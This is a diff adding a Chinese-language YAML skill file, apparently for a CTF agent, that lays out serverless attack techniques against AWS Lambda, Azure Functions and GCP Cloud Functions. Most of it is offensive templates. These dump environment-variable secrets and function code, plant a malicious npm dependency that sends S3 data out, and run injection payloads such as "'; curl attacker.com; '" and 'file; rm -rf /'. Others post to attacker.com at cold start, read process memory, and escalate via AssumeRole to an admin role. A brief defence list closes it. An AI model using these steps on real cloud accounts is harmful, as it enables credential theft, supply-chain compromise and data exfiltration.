@@ -1,0 +1,535 @@
+name: serverless_security
+description: 无服务器安全 - 涵盖Lambda函数攻击、云函数漏洞、Serverless应用渗透测试技术
+version: "2.0"
+author: CTF-Agent Team
+tags: [serverless, lambda, cloud-function, aws, azure, gcp]
+priority: medium
+
+# 使用场景
+scenarios:
+  - AWS Lambda安全评估
+  - Azure Functions渗透测试
+  - GCP Cloud Functions漏洞挖掘
+  - Serverless应用安全审计
+  - FaaS平台安全研究
+
+# 核心技术
+techniques:
+  - Lambda函数攻击: AWS Lambda漏洞利用
+  - 环境变量泄露: 窃取函数环境变量
+  - 依赖包攻击: 通过依赖注入恶意代码
+  - 内存取证: 从函数内存提取敏感信息
+  - 冷启动攻击: 利用冷启动时序漏洞
+  - 资源耗尽: 函数资源限制绕过
+
+# 工具列表
+tools:
+  - AWS CLI: AWS命令行工具
+  - Lambda Tools: Lambda安全工具
+  - Serverless Framework: Serverless框架
+  - Pacu: AWS渗透框架
+  - CloudGoat: AWS脆弱环境
+  - Azucar: Azure安全审计
+  - GCP Scanner: GCP安全扫描
+
+# Serverless架构理解
+serverless_architecture:
+  - providers:
+      AWS Lambda: AWS无服务器函数
+      Azure Functions: Azure函数服务
+      GCP Cloud Functions: Google云函数
+      Alibaba Function Compute: 阿里云函数计算
+      Tencent SCF: 腾讯云无服务器
+
+  - characteristics:
+      Event-driven: 事件驱动执行
+      Stateless: 无状态设计
+      Ephemeral: 短暂执行环境
+      Cold Start: 冷启动延迟
+      Resource Limits: 资源限制
+
+  - event_sources:
+      API Gateway: HTTP API触发
+      S3: 存储事件触发
+      DynamoDB: 数据库流触发
+      SQS/SNS: 消息队列触发
+      CloudWatch: 监控事件触发
+      Scheduled: 定时触发
+
+# AWS Lambda攻击
+aws_lambda_attack:
+  - function_enumeration:
+    template: |
+      # Lambda函数枚举
+
+      # 1. 列出所有函数
+      aws lambda list-functions --region us-east-1
+
+      # 2. 获取函数详情
+      aws lambda get-function --function-name target-function
+
+      # 3. 获取函数代码
+      aws lambda get-function --function-name target-function --query 'Code.Location'
+
+      # 4. 获取环境变量
+      aws lambda get-function-configuration --function-name target-function --query 'Environment.Variables'
+
+      # 5. 获取函数策略
+      aws lambda get-policy --function-name target-function
+
+      # 6. 查看函数日志
+      aws logs describe-log-streams --log-group-name /aws/lambda/target-function
+
+  - environment_variable_leak:
+    template: |
+      # Lambda环境变量泄露
+
+      # 常见敏感环境变量:
+      # - DATABASE_URL
+      # - API_KEY
+      # - SECRET_TOKEN
+      # - AWS_ACCESS_KEY_ID (如果错误配置)
+      # - PASSWORD
+
+      # 1. 直接获取
+      aws lambda get-function-configuration \
+        --function-name target \
+        --query 'Environment.Variables'
+
+      # 2. 通过日志获取
+      # 函数可能打印环境变量
+      aws logs get-log-events \
+        --log-group-name /aws/lambda/target \
+        --log-stream-name stream-name
+
+      # 3. 通过代码获取
+      # 下载函数代码分析
+
+      # 下载代码
+      code_url = aws lambda get-function --function-name target --query 'Code.Location'
+      wget $code_url
+
+      # 分析代码查找敏感信息
+      grep -r "process.env" function.zip
+      grep -r "SECRET" function.zip
+
+      # 4. 通过错误消息获取
+      # 触发函数错误可能泄露信息
+
+  - code_extraction:
+    template: |
+      # Lambda代码提取
+
+      # 1. 获取代码位置
+      aws lambda get-function --function-name target
+
+      # 输出包含:
+      # {
+      #   "Code": {
+      #     "RepositoryType": "S3",
+      #     "Location": "https://s3.amazonaws.com/..."
+      #   }
+      # }
+
+      # 2. 下载代码
+      curl -o function.zip "https://s3.amazonaws.com/..."
+
+      # 3. 解压分析
+      unzip function.zip
+      cat index.js  # 或其他主文件
+
+      # 4. 查找敏感信息
+      grep -E "(password|secret|key|token)" -r .
+
+      # 5. 分析依赖
+      cat package.json
+      cat requirements.txt
+
+      # 查找可能的依赖漏洞
+
+  - dependency_attack:
+    template: |
+      # Lambda依赖攻击
+
+      # 1. 供应链攻击
+
+      # Lambda函数使用外部依赖
+      # 可以通过:
+      # - 植入恶意npm包
+      # - 植入恶意pip包
+      # - 修改现有包
+
+      # 示例恶意依赖
+      malicious_package = """
+      // package.json中的依赖
+      "dependencies": {
+          "lodash": "^4.17.21",
+          "malicious-helper": "^1.0.0"  // 植入恶意包
+      }
+
+      // malicious-helper/index.js
+      const AWS = require('aws-sdk');
+      const s3 = new AWS.S3();
+
+      module.exports = {
+          helper: function() {
+              // 隐藏的恶意操作
+              s3.listBuckets().promise()
+                  .then(data => sendToAttacker(data));
+          }
+      }
+      """
+
+      # 2. 植入方式
+
+      # 如果有代码修改权限:
+      # - 直接修改依赖
+      # - 更新package.json/requirements.txt
+      # - 上传新版本函数
+
+      # 3. 利用现有漏洞
+
+      # 检查函数依赖漏洞
+      npm audit
+      pip safety check
+
+      # 利用已知CVE
+
+  - lambda_injection:
+    template: |
+      # Lambda输入注入
+
+      # 1. 通过API Gateway注入
+
+      # Lambda函数可能处理API输入
+      # 输入验证不当可能导致注入
+
+      # 测试注入
+      curl -X POST https://api-id.execute-api.region.amazonaws.com/prod/function \
+        -H "Content-Type: application/json" \
+        -d '{"input": "$(cat /etc/passwd)"}'
+
+      # 2. 通过事件注入
+
+      # S3事件触发
+      # 文件名注入
+      filename = "file; rm -rf /"
+
+      # SQS消息注入
+      message_body = '{"key": "value", "malicious": "payload"}'
+
+      # 3. 环境注入
+
+      # 如果函数使用环境变量拼接命令
+      # 环境变量注入
+
+      process.env.USER_INPUT = "'; curl attacker.com; '"
+
+  - memory_extraction:
+    template: |
+      # Lambda内存提取
+
+      # Lambda执行时敏感数据可能在内存中
+
+      # 1. 通过函数代码读取内存
+
+      # Python Lambda
+      import ctypes
+      import os
+
+      def lambda_handler(event, context):
+          # 尝试读取内存
+          # 获取进程内存映射
+          maps = open('/proc/self/maps').read()
+
+          # 读取内存区域
+          for line in maps.split('\n'):
+              if 'rw' in line:  # 可读写区域
+                  addr_range = line.split()[0]
+                  start, end = [int(x, 16) for x in addr_range.split('-')]
+                  size = end - start
+
+                  # 尝试读取
+                  try:
+                      mem = open('/proc/self/mem', 'rb')
+                      mem.seek(start)
+                      data = mem.read(size)
+                      # 分析数据寻找敏感信息
+                  except:
+                      pass
+
+      # 2. 通过临时文件提取
+
+      # Lambda有/tmp目录
+      # 检查临时文件
+
+      import os
+      tmp_files = os.listdir('/tmp')
+      for f in tmp_files:
+          content = open(f).read()
+          if 'secret' in content or 'password' in content:
+              print(content)
+
+      # 3. 通过日志泄露
+
+      # 函数可能意外打印敏感数据
+      # 检查CloudWatch Logs
+
+      aws logs get-log-events --log-group-name /aws/lambda/target
+
+  - privilege_escalation:
+    template: |
+      # Lambda权限提升
+
+      # 1. IAM角色滥用
+
+      # Lambda有执行角色
+      # 检查角色权限
+
+      aws lambda get-function-configuration \
+        --function-name target \
+        --query 'ExecutionRoleArn'
+
+      # 获取角色权限
+      aws iam get-role-policy --role-name lambda-role --policy-name policy-name
+
+      # 2. 利用高权限角色
+
+      # 如果角色有广泛权限
+      # 可以:
+      # - 创建新IAM用户
+      # - 修改其他资源
+      # - 访问敏感S3 bucket
+
+      # 示例: 如果Lambda有s3:*权限
+      def lambda_handler(event, context):
+          s3 = boto3.client('s3')
+          # 列出所有bucket
+          buckets = s3.list_buckets()
+          # 下载敏感数据
+          s3.download_file('sensitive-bucket', 'secret.txt', '/tmp/secret.txt')
+
+      # 3. AssumeRole利用
+
+      # 如果角色可以AssumeRole到更高权限角色
+
+      sts = boto3.client('sts')
+      assumed = sts.assume_role(
+          RoleArn='arn:aws:iam::123456789012:role/AdminRole',
+          RoleSessionName='Session'
+      )
+
+      # 使用临时凭证
+      creds = assumed['Credentials']
+
+# Azure Functions攻击
+azure_functions_attack:
+  - template: |
+      # Azure Functions安全测试
+
+      # 1. 函数枚举
+      az functionapp list
+
+      # 2. 获取函数详情
+      az functionapp show --name target-function --resource-group rg-name
+
+      # 3. 获取函数代码
+      # 通过部署中心查看
+
+      # 4. 获取环境变量
+      az functionapp config appsettings list --name target-function --resource-group rg-name
+
+      # 5. 函数密钥泄露
+      # Azure Functions有管理密钥
+
+      # 获取密钥
+      az functionapp keys list --name target-function --resource-group rg-name
+
+      # 密钥可用于调用函数
+      curl https://target-function.azurewebsites.net/api/endpoint?code=master_key
+
+      # 6. 持久化
+
+      # 通过函数扩展植入
+      # 修改部署配置
+
+# GCP Cloud Functions攻击
+gcp_functions_attack:
+  - template: |
+      # GCP Cloud Functions安全测试
+
+      # 1. 函数枚举
+      gcloud functions list
+
+      # 2. 获取函数详情
+      gcloud functions describe target-function
+
+      # 3. 获取函数代码
+      gcloud functions source download target-function
+
+      # 4. 获取环境变量
+      gcloud functions describe target-function --format="value(environmentVariables)"
+
+      # 5. 服务账号利用
+
+      # Cloud Functions有服务账号
+      gcloud functions describe target-function --format="value(serviceAccountEmail)"
+
+      # 检查服务账号权限
+      gcloud projects get-iam-policy project-id \
+        --flatten="bindings[].members" \
+        --filter="bindings.members:serviceAccount:function-sa@project.iam.gserviceaccount.com"
+
+      # 6. 通过函数访问其他资源
+
+      # 如果服务账号有高权限
+
+# 冷启动攻击
+cold_start_attack:
+  - template: |
+      # Serverless冷启动攻击
+
+      # 1. 冷启动特性
+
+      # Lambda首次调用或长时间未调用后
+      # 需要冷启动: 加载代码、初始化环境
+
+      # 冷启动期间可能:
+      # - 初始化代码执行
+      # - 全局变量初始化
+      # - 依赖加载
+
+      # 2. 利用初始化漏洞
+
+      # Python Lambda
+      # 全局代码在冷启动时执行
+
+      import requests
+
+      # 这段代码在冷启动时执行
+      ATTACKER_URL = "https://attacker.com"
+      requests.post(ATTACKER_URL, json={"info": "cold start triggered"})
+
+      def lambda_handler(event, context):
+          # 函数逻辑
+          return "Hello"
+
+      # 3. 时序攻击
+
+      # 冷启动时间较长
+      # 可能暴露内部状态
+
+      # 4. 容器复用攻击
+
+      # Lambda容器可能复用
+      # 上一次执行的残留数据
+
+      def lambda_handler(event, context):
+          # 检查/tmp目录残留
+          import os
+          files = os.listdir('/tmp')
+          # 可能有上一次执行的文件
+
+# 资源限制绕过
+resource_limit_bypass:
+  - template: |
+      # Serverless资源限制
+
+      # AWS Lambda限制:
+      # - 内存: 128MB - 10GB
+      # - 时间: 15分钟最大
+      # - 存储: /tmp 512MB-10GB
+      # - 并发: 默认1000
+
+      # 1. 时间限制绕过
+
+      # 方法A: 调用其他函数继续执行
+      def lambda_handler(event, context):
+          # 执行15分钟后
+          # 调用另一个Lambda继续
+          lambda_client.invoke(
+              FunctionName='continuation-function',
+              InvocationType='Event',  # 异步
+              Payload=json.dumps({'state': current_state})
+          )
+
+      # 方法B: 使用Step Functions编排
+
+      # 2. 内存限制绕过
+
+      # 使用外部存储代替内存
+      # S3、DynamoDB等
+
+      # 3. 并发限制绕过
+
+      # 分散到多个区域/账号
+
+      # 4. /tmp存储利用
+
+      # Lambda有/tmp可用
+      import os
+      os.listdir('/tmp')
+
+      # 可以用于:
+      # - 临时存储敏感数据
+      # - 下载大文件分析
+      # - 执行需要临时空间的操作
+
+# Serverless CTF场景
+ctf_scenarios:
+  - lambda_flag:
+    template: |
+      # Lambda CTF场景
+
+      # 场景1: Flag在环境变量
+
+      aws lambda get-function-configuration --function-name flag-function --query 'Environment.Variables.FLAG'
+
+      # 场景2: Flag在函数代码
+
+      # 下载代码分析
+      aws lambda get-function --function-name flag-function --query 'Code.Location'
+      wget $code_url
+      unzip function.zip
+      grep -r "FLAG" .
+
+      # 场景3: Flag需要触发函数
+
+      curl -X POST https://api.execute-api.region.amazonaws.com/prod/flag \
+        -H "x-api-key: key" \
+        -d '{"action": "get_flag"}'
+
+      # 场景4: Flag在S3 (Lambda有权限访问)
+
+      # 通过Lambda间接访问S3
+      curl https://api.execute-api.../trigger-lambda
+
+      # Lambda读取S3返回flag
+
+# 防御措施
+defense:
+  - 函数安全:
+      - 最小权限原则
+      - 环境变量加密
+      - 代码审计
+      - 输入验证
+
+  - 依赖安全:
+      - 依赖审计
+      - 锁定版本
+      - 使用可信源
+      - 定期更新
+
+  - 监控审计:
+      - CloudWatch监控
+      - 异常调用检测
+      - 审计日志记录
+      - 成本监控
+
+# 参考资源
+references:
+  - https://docs.aws.amazon.com/lambda/
+  - https://github.com/RhinoSecurityLabs/pacu
+  - https://github.com/RhinoSecurityLabs/cloudgoat
+  - https://azure.microsoft.com/en-us/services/functions/
+  - https://cloud.google.com/functions
